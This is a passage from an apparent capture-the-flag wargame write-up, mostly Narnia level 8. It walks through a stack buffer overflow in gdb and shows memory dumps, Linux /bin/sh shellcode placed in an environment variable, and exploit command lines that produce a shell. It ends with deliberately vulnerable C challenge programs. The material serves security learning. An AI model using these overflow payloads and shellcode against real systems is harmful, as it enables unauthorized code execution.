</span><span class='line'>  <span class="c1">//int i=0;</span>
</span><span class='line'>  
</span><span class='line'>  <span class="n">memset</span><span class="p">(</span><span class="n">bok</span><span class="p">,</span> <span class="sc">&#39;\0&#39;</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">bok</span><span class="p">));</span>
</span><span class='line'>  <span class="k">for</span><span class="p">(</span><span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="n">blah</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">!=</span> <span class="sc">&#39;\0&#39;</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
</span><span class='line'>      <span class="n">bok</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="o">=</span><span class="n">blah</span><span class="p">[</span><span class="n">i</span><span class="p">];</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">printf</span><span class="p">(</span><span class="s">&quot;%s</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="n">bok</span><span class="p">);</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">){</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">if</span><span class="p">(</span><span class="n">argc</span> <span class="o">&gt;</span> <span class="mi">1</span><span class="p">)</span>
</span><span class='line'>      <span class="n">func</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
</span><span class='line'>  <span class="k">else</span>
</span><span class='line'>  <span class="n">printf</span><span class="p">(</span><span class="s">&quot;%s argument</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>

Let&#8217;s see what is happening here: for loop in function func copies data from blah to bok character array until a null character is found. Let&#8217;s see how the stack would look like
<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='C'><span class='line'><span class="o">&lt;</span><span class="n">bok</span> <span class="n">character</span> <span class="n">array</span><span class="o">&gt;&lt;</span><span class="n">blah</span> <span class="n">pointer</span><span class="o">&gt;&lt;</span><span class="n">fp</span><span class="o">&gt;&lt;</span><span class="n">ret</span><span class="o">&gt;&lt;</span><span class="n">pointer</span> <span class="n">b</span><span class="o">&gt;</span>
</span></code></pre></td></tr></table></div></figure>
Let&#8217;s confirm this by using gdb? We put an breakpoint on printf function in the func function.
<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class='C'><span class='line'><span class="mh">0xffffd670</span><span class="o">:</span>  <span class="mh">0x08048580</span>  <span class="mh">0xffffd688</span>  <span class="mh">0x00000014</span>  <span class="mh">0xf7e54f53</span>
</span><span class='line'><span class="mh">0xffffd680</span><span class="o">:</span>    <span class="mh">0x00000000</span>  <span class="mh">0x00ca0000</span>  <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>
</span><span class='line'><span class="mh">0xffffd690</span><span class="o">:</span>    <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>  <span class="mh">0x00414141</span>  <span class="mh">0xffffd8b1</span>
</span><span class='line'><span class="mh">0xffffd6a0</span><span class="o">:</span>    <span class="mh">0x00000002</span>  <span class="mh">0xffffd764</span>  <span class="mh">0xffffd6c8</span>  <span class="mh">0x080484cd</span>
</span><span class='line'><span class="mh">0xffffd6b0</span><span class="o">:</span>    <span class="mh">0xffffd8b1</span>  <span class="mh">0xf7ffd000</span>  <span class="mh">0x080484fb</span>  <span class="mh">0xf7fca000</span>
</span></code></pre></td></tr></table></div></figure>
Address 0xffffd689 marks the start of the character buffer bok. I entered 19 A so it&#8217;s 0x41 19 times followed by null 0x00. Followed by that is 0xffffd8b1 (Value of Blah pointer). Followed by fp 12 bytes <0x00000002 0xffffd764 0xffffd6c8>. Followed by 0x080484cd which is the return address
<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='C'><span class='line'><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">x</span><span class="o">/</span><span class="n">s</span> <span class="mh">0x080484cd</span>
</span><span class='line'><span class="mh">0x80484cd</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">31</span><span class="o">&gt;:</span>    <span class="s">&quot;</span><span class="se">\353\025\213</span><span class="s">E</span><span class="se">\f\213</span><span class="s">&quot;</span>
</span></code></pre></td></tr></table></div></figure>
followed by pointer b (0xffffd8b1).
Let&#8217;s see what&#8217;s at location 0xffffd8b1
<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='C'><span class='line'><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">x</span><span class="o">/</span><span class="mi">20</span><span class="n">wx</span> <span class="mh">0xffffd8b1</span>
</span><span class='line'><span class="mh">0xffffd8b1</span><span class="o">:</span>    <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>
</span><span class='line'><span class="mh">0xffffd8c1</span><span class="o">:</span>    <span class="mh">0x00414141</span>  <span class="mh">0x5f474458</span>  <span class="mh">0x53534553</span>  <span class="mh">0x5f4e4f49</span>
</span></code></pre></td></tr></table></div></figure>

Let&#8217;s see what happens when we try to enter more than the 19 character (buffer size of bok - 1 byte (for null character))
<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='C'><span class='line'><span class="n">narnia8</span><span class="err">@</span><span class="nl">melinda</span><span class="p">:</span><span class="o">/</span><span class="n">narnia</span><span class="err">$</span> <span class="p">.</span><span class="o">/</span><span class="n">narnia8</span> <span class="err">`</span><span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="err">&#39;</span><span class="n">print</span> <span class="s">&quot;A&quot;</span><span class="o">*</span><span class="mi">20</span><span class="err">&#39;`</span>
</span><span class='line'><span class="n">AAAAAAAAAAAAAAAAAAAA</span><span class="err">����</span>
</span><span class='line'><span class="n">narnia8</span><span class="err">@</span><span class="nl">melinda</span><span class="p">:</span><span class="o">/</span><span class="n">narnia</span><span class="err">$</span> <span class="p">.</span><span class="o">/</span><span class="n">narnia8</span> <span class="err">`</span><span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="err">&#39;</span><span class="n">print</span> <span class="s">&quot;A&quot;</span><span class="o">*</span><span class="mi">20</span><span class="err">&#39;`</span> <span class="o">|</span> <span class="n">hexdump</span>
</span><span class='line'><span class="mo">0000000</span> <span class="mi">4141</span> <span class="mi">4141</span> <span class="mi">4141</span> <span class="mi">4141</span> <span class="mi">4141</span> <span class="mi">4141</span> <span class="mi">4141</span> <span class="mi">4141</span>
</span><span class='line'><span class="mo">0000010</span> <span class="mi">4141</span> <span class="mi">4141</span> <span class="n">d8bf</span> <span class="n">ffff</span> <span class="mi">0</span><span class="n">a02</span>
</span><span class='line'><span class="mo">000001</span><span class="n">a</span>
</span></code></pre></td></tr></table></div></figure>
As expected, we get A followed by some garbage. which is the address where blah is pointing.

We know that we can overwrite the RET address by 
<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='C'><span class='line'><span class="cp"># `python -c &#39;print &quot;A&quot;*20 + &quot;\x90\x90\x90\x90&quot; + &quot;A&quot;*12 + &quot;BBBB&quot;&#39;`</span>
</span></code></pre></td></tr></table></div></figure>
Let&#8217;s see what happens when we do this. After copying 20 A it copies \x90 and makes blah pointer from 0xffffd8bf to 0xffffd890. Because of the for loop
<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='C'><span class='line'><span class="k">for</span><span class="p">(</span><span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="n">blah</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">!=</span> <span class="sc">&#39;\0&#39;</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
</span></code></pre></td></tr></table></div></figure>
It now copies the character from 0xffffd890 reference i.e 0xffffd890 + i value. Suppose it copied the character 0x41. The address becomes 0xffff4190 and now for loop searches from that address until a null character is found.
<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>(gdb) x/20xw $esp
</span><span class='line'>0xffffd660:   0xffffd678  0x00000000  0x00000014  0xf7e54f53
</span><span class='line'>0xffffd670:   0x00000000  0x00ca0000  0x41414141  0x41414141
</span><span class='line'>0xffffd680:   0x41414141  0x41414141  0x41414141  0xffffd890
</span><span class='line'>0xffffd690:   0x00000002  0xffffd754  0xffffd6b8  0x080484cd
</span><span class='line'>0xffffd6a0:   0xffffd89c  0xf7ffd000  0x080484fb  0xf7fca000
</span><span class='line'>
</span><span class='line'>(gdb) x/10xw 0xffffd890
</span><span class='line'>0xffffd890:   0x2f61696e  0x6e72616e  0x00386169  0x41414141
</span><span class='line'>0xffffd8a0:   0x41414141  0x41414141  0x41414141  0x41414141
</span><span class='line'>0xffffd8b0:   0x90909090  0x41414141
</span><span class='line'>
</span><span class='line'>(gdb) x/20xw $esp
</span><span class='line'>0xffffd660:   0x08048580  0xffffd678  0x00000014  0xf7e54f53
</span><span class='line'>0xffffd670:   0x00000000  0x00ca0000  0x41414141  0x41414141
</span><span class='line'>0xffffd680:   0x41414141  0x41414141  0x41414141  0xffff4190
</span><span class='line'>0xffffd690:   0x00000002  0xffffd754  0xffffd6b8  0x080484cd
</span><span class='line'>0xffffd6a0:   0xffffd89c  0xf7ffd000  0x080484fb  0xf7fca000
</span><span class='line'>
</span><span class='line'>(gdb) x/10xw 0xffff4190
</span><span class='line'>0xffff4190:   0x00000000  0x00000000  0x00000000  0x00000000
</span><span class='line'>0xffff41a0:   0x00000000  0x00000000  0x00000000  0x00000000
</span><span class='line'>0xffff41b0:   0x00000000  0x00000000</span></code></pre></td></tr></table></div></figure>

If we can somehow keep/change the blah pointer back to it&#8217;s original value we may overwrite the RET pointer (after 12 bytes). Let&#8217;s see how 0xffffd89c looks when is used
<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>`python -c 'print "A"*20 + "\x90\x90\x90\x90" + "A"*12 + "BBBB"'`</span></code></pre></td></tr></table></div></figure>
<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>(gdb) x/30xw 0xffffd89c
</span><span class='line'>0xffffd89c:   0x41414141  0x41414141  0x41414141  0x41414141
</span><span class='line'>0xffffd8ac:   0x41414141  0x90909090  0x41414141  0x41414141
</span><span class='line'>0xffffd8bc:   0x41414141  0x42424242  0x47445800  0x5345535f</span></code></pre></td></tr></table></div></figure>

When we used the below with the address, we were able to overwrite the RET by BBBB. Now, we control the EIP :)
<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>(gdb) run `python -c 'print "A"*20 + "\x9c\xd8\xff\xff" + "A"*12 + "BBBB"'`
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>(gdb) x/20xw $esp
</span><span class='line'>0xffffd660:   0x08048580  0xffffd678  0x00000014  0xf7e54f53
</span><span class='line'>0xffffd670:   0x00000000  0x00ca0000  0x41414141  0x41414141
</span><span class='line'>0xffffd680:   0x41414141  0x41414141  0x41414141  0xffffd89c
</span><span class='line'>0xffffd690:   0x41414141  0x41414141  0x41414141  0x42424242</span></code></pre></td></tr></table></div></figure>

Let&#8217;s export a shellcode using a environment variable check it&#8217;s address on the stack and redirect the flow of our code to it. Notice the number of NOPs we have put for easy identification plus reachability.
<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>export EGG=`python -c 'print "\x90"*90 + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"'`</span></code></pre></td></tr></table></div></figure>

Searching our environment variable we get it at address 0xffffd8d4.
<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>(gdb) x/100xw $esp+500
</span><span class='line'>0xffffd7e4:   0x0000000f  0xffffd80b  0x00000000  0x00000000
</span><span class='line'>0xffffd7f4:   0x00000000  0xde000000  0x1a2a5992  0xf11444ea
</span><span class='line'>0xffffd804:   0x11433cf3  0x694a71a2  0x00363836  0x672f0000
</span><span class='line'>0xffffd814:   0x73656d61  0x72616e2f  0x2f61696e  0x6e72616e
</span><span class='line'>0xffffd824:   0x00386169  0x41414141  0x41414141  0x41414141
</span><span class='line'>0xffffd834:   0x41414141  0x41414141  0xffffd828  0x41414141
</span><span class='line'>0xffffd844:   0x41414141  0x41414141  0x42424242  0x47445800
</span><span class='line'>0xffffd854:   0x5345535f  0x4e4f4953  0x3d44495f  0x35343239
</span><span class='line'>0xffffd864:   0x45485300  0x2f3d4c4c  0x2f6e6962  0x68736162
</span><span class='line'>0xffffd874:   0x52455400  0x74783d4d  0x006d7265  0x5f485353
</span><span class='line'>0xffffd884:   0x45494c43  0x353d544e  0x34392e39  0x2e31362e
</span><span class='line'>0xffffd894:   0x20343731  0x37373835  0x32322032  0x48535300
</span><span class='line'>0xffffd8a4:   0x5954545f  0x65642f3d  0x74702f76  0x31312f73
</span><span class='line'>0xffffd8b4:   0x5f434c00  0x3d4c4c41  0x47450043  0x90903d47
</span><span class='line'>0xffffd8c4:   0x90909090  0x90909090  0x90909090  0x90909090
</span><span class='line'>0xffffd8d4:   0x90909090  0x90909090  0x90909090  0x90909090
</span><span class='line'>0xffffd8e4:   0x90909090  0x90909090  0x90909090  0x90909090
</span><span class='line'>0xffffd8f4:   0x90909090  0x90909090  0x90909090  0x90909090
</span><span class='line'>0xffffd904:   0x90909090  0x90909090  0x90909090  0x90909090
</span><span class='line'>0xffffd914:   0x90909090  0x90909090  0x99580b6a  0x2f2f6852
</span><span class='line'>0xffffd924:   0x2f686873  0x896e6962  0xcdc931e3  0x53550080
</span><span class='line'>0xffffd934:   0x6e3d5245  0x696e7261  0x4c003861  0x4f435f53
</span><span class='line'>0xffffd944:   0x53524f4c  0x3d73723d  0x69643a30  0x3b31303d</span></code></pre></td></tr></table></div></figure>

Let&#8217;s redirect our program to 0xffffd8d4 to get the shell
<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>(gdb) run `python -c 'print "A"*20 + "\x28\xd8\xff\xff" + "A"*12 + "\xd4\xd8\xff\xff"'`
</span><span class='line'>The program being debugged has been started already.
</span><span class='line'>Start it from the beginning? (y or n) y
</span><span class='line'>Starting program: /games/narnia/narnia8 `python -c 'print "A"*20 + "\x28\xd8\xff\xff" + "A"*12 + "\xd4\xd8\xff\xff"'`
</span><span class='line'>
</span><span class='line'>Breakpoint 1, 0x080484a7 in func ()
</span><span class='line'>(gdb) c
</span><span class='line'>Continuing.
</span><span class='line'>AAAAAAAAAAAAAAAAAAAA(���AAAAAAAAAAAA����(���
</span><span class='line'>process 19900 is executing new program: /bin/dash
</span><span class='line'>Error in re-setting breakpoint 1: No symbol table is loaded.  Use the "file" command.
</span><span class='line'>Error in re-setting breakpoint 1: No symbol "func" in current context.
</span><span class='line'>Error in re-setting breakpoint 1: No symbol "func" in current context.
</span><span class='line'>Error in re-setting breakpoint 1: No symbol "func" in current context.
</span><span class='line'>$ </span></code></pre></td></tr></table></div></figure>

Trying this without gdb didn&#8217;t work because the address of character array changes
<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>narnia8@melinda:/narnia$ ./narnia8 `python -c 'print "A"*20 + "\x28\xd8\xff\xff" + "B"*12 + "\xd4\xd8\xff\xff"'` 
</span><span class='line'>AAAAAAAAAAAAAAAAAAAA(A��
</span><span class='line'>narnia8@melinda:/narnia$ ./narnia8 `python -c 'print "A"*20 + "\x28\xd8\xff\xff" + "B"*12 + "\xd4\xd8\xff\xff"'` | hexdump
</span><span class='line'>0000000 4141 4141 4141 4141 4141 4141 4141 4141
</span><span class='line'>0000010 4141 4141 4128 ffff 0a02               
</span><span class='line'>000001a</span></code></pre></td></tr></table></div></figure>
Changing 28 to 0a just by chance gave me the correct address to be pointed at
<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>narnia8@melinda:/narnia$ ./narnia8 `python -c 'print "A"*20 + "\x0a\xd8\xff\xff" + "B"*12 + "\xd4\xd8\xff\xff"'` | hexdump
</span><span class='line'>0000000 4141 4141 4141 4141 4141 4141 4141 4141
</span><span class='line'>0000010 4141 4141 d837 ffff 0a03               </span></code></pre></td></tr></table></div></figure>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>narnia8@melinda:/narnia$ ./narnia8 `python -c 'print "A"*20 + "\x37\xd8\xff\xff" + "B"*12 + "\xd4\xd8\xff\xff"'`          
</span><span class='line'>AAAAAAAAAAAAAAAAAAAA7���BBBBBBBBBBBB����7���
</span><span class='line'>$ </span></code></pre></td></tr></table></div></figure>
</li>

<li>
For example, below you need the address of secret to write the new value 0x1337beef.
<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
</pre></td><td class='code'><pre><code class='C'><span class='line'><span class="kt">unsigned</span> <span class="n">secret</span> <span class="o">=</span> <span class="mh">0xdeadbeef</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">){</span>
</span><span class='line'>    <span class="kt">unsigned</span> <span class="o">*</span><span class="n">ptr</span><span class="p">;</span>
</span><span class='line'>    <span class="kt">unsigned</span> <span class="n">value</span><span class="p">;</span>
</span><span class='line'>    <span class="kt">char</span> <span class="n">key</span><span class="p">[</span><span class="mi">33</span><span class="p">];</span>
</span><span class='line'>    <span class="kt">FILE</span> <span class="o">*</span><span class="n">f</span><span class="p">;</span>
</span><span class='line'>    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Welcome! I will grant you one arbitrary write!</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
</span><span class='line'>    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Where do you want to write to? &quot;</span><span class="p">);</span>
</span><span class='line'>    <span class="n">scanf</span><span class="p">(</span><span class="s">&quot;%p&quot;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">ptr</span><span class="p">);</span>
</span><span class='line'>    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Okay! What do you want to write there? &quot;</span><span class="p">);</span>
</span><span class='line'>    <span class="n">scanf</span><span class="p">(</span><span class="s">&quot;%p&quot;</span><span class="p">,</span> <span class="p">(</span><span class="kt">void</span> <span class="o">**</span><span class="p">)</span><span class="o">&amp;</span><span class="n">value</span><span class="p">);</span>
</span><span class='line'>    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Writing %p to %p...</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="n">value</span><span class="p">,</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="n">ptr</span><span class="p">);</span>
</span><span class='line'>    <span class="o">*</span><span class="n">ptr</span> <span class="o">=</span> <span class="n">value</span><span class="p">;</span>
</span><span class='line'>    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Value written!</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
</span><span class='line'>    <span class="k">if</span> <span class="p">(</span><span class="n">secret</span> <span class="o">==</span> <span class="mh">0x1337beef</span><span class="p">){</span>
</span><span class='line'>        <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Woah! You changed my secret!</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
</span><span class='line'>        <span class="n">printf</span><span class="p">(</span><span class="s">&quot;I guess this means you get a flag now...</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>        <span class="n">f</span> <span class="o">=</span> <span class="n">fopen</span><span class="p">(</span><span class="s">&quot;flag.txt&quot;</span><span class="p">,</span> <span class="s">&quot;r&quot;</span><span class="p">);</span>
</span><span class='line'>        <span class="n">fgets</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="mi">32</span><span class="p">,</span> <span class="n">f</span><span class="p">);</span>
</span><span class='line'>        <span class="n">fclose</span><span class="p">(</span><span class="n">f</span><span class="p">);</span>
</span><span class='line'>        <span class="n">puts</span><span class="p">(</span><span class="n">key</span><span class="p">);</span>
</span><span class='line'>        <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;My secret is still safe! Sorry.</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>
</li>

<li>In another challenge below, It can be easily seen the value of secret can be changed after entering 16 characters + 0xc0deface. As, 0xc0deface can&#8217;t be printed as ASCII characters, you can use python to pass the input.
<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='C'><span class='line'><span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="err">&#39;</span> <span class="n">print</span> <span class="s">&quot;A&quot;</span> <span class="o">*</span> <span class="mi">16</span> <span class="o">+</span> <span class="s">&quot;</span><span class="se">\xc0\xde\xfa\xce</span><span class="s">&quot;</span><span class="err">&#39;</span> <span class="n">or</span> <span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="err">&#39;</span> <span class="n">print</span> <span class="s">&quot;A&quot;</span> <span class="o">*</span> <span class="mi">16</span> <span class="o">+</span> <span class="s">&quot;</span><span class="se">\xce\xfa\xde\xc0</span><span class="s">&quot;</span><span class="err">&#39;</span> <span class="n">based</span> <span class="n">on</span> <span class="n">the</span> <span class="n">endianess</span> <span class="n">of</span> <span class="n">the</span> <span class="n">system</span><span class="p">.</span>
</span></code></pre></td></tr></table></div></figure>
<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
</pre></td><td class='code'><pre><code class='C'><span class='line'><span class="kt">void</span> <span class="nf">give_shell</span><span class="p">(){</span>
</span><span class='line'>    <span class="kt">gid_t</span> <span class="n">gid</span> <span class="o">=</span> <span class="n">getegid</span><span class="p">();</span>
</span><span class='line'>    <span class="n">setresgid</span><span class="p">(</span><span class="n">gid</span><span class="p">,</span> <span class="n">gid</span><span class="p">,</span> <span class="n">gid</span><span class="p">);</span>
</span><span class='line'>    <span class="n">system</span><span class="p">(</span><span class="s">&quot;/bin/sh -i&quot;</span><span class="p">);</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="kt">void</span> <span class="nf">vuln</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">input</span><span class="p">){</span>
</span><span class='line'>    <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">16</span><span class="p">];</span>
</span><span class='line'>    <span class="kt">int</span> <span class="n">secret</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'>    <span class="n">strcpy</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="n">input</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">if</span> <span class="p">(</span><span class="n">secret</span> <span class="o">==</span> <span class="mh">0xc0deface</span><span class="p">){</span>
</span><span class='line'>        <span class="n">give_shell</span><span class="p">();</span>
</span><span class='line'>    <span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span><span class='line'>        <span class="n">printf</span><span class="p">(</span><span class="s">&quot;The secret is %x</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">secret</span><span class="p">);</span>
</span><span class='line'>    <span class="p">}</span>
